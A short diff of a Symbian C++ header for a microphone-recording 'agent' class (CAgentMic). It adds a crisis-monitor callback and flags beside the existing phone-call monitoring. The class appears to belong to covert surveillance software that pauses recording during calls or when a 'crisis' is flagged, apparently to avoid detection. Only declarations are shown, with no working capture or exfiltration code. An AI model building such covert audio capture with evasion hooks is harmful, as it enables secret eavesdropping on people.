@@ -19,6 +19,7 @@
 #include "AbstractAgent.h"
 #include "AdditionalDataStructs.h"
 #include "SlimMonitorPhoneCall.h"
+#include "MonitorCrisis.h"
 #include <MdaAudioInputStream.h>
 #include <mda\common\audio.h>
 #include <mmf\common\mmfutilities.h>
@@ -32,7 +33,7 @@
  *  CAgentMic
  * 
  */
-class CAgentMic : public CAbstractAgent, public MMdaAudioInputStreamCallback, public MSlimCallMonCallBack, public MTimeOutNotifier
+class CAgentMic : public CAbstractAgent, public MMdaAudioInputStreamCallback, public MSlimCallMonCallBack, public MTimeOutNotifier, public MCrisisCallBack
 	{
 public:
 	// Constructors and destructor
@@ -79,6 +80,10 @@ private:
 
 	// From MTimeOutNotifier
 	virtual void TimerExpiredL(TAny* src);
+	
+	// From MCrisisCallBack
+	virtual void CrisisOnL();
+	virtual void CrisisOffL();
 	    
 	/*
 	 * MaiscOpenComplete()
@@ -131,6 +136,10 @@ private: // data members
 	
 	CSlimPhoneCallMonitor*	iCallMonitor;
 	CTimeOutTimer* 	iTimer;
+	
+	CMonitorCrisis*	iCrisisMonitor;
+	TBool           iCrisis;
+	TBool			iCall;
 	
 	__FLOG_DECLARATION_MEMBER
 	};
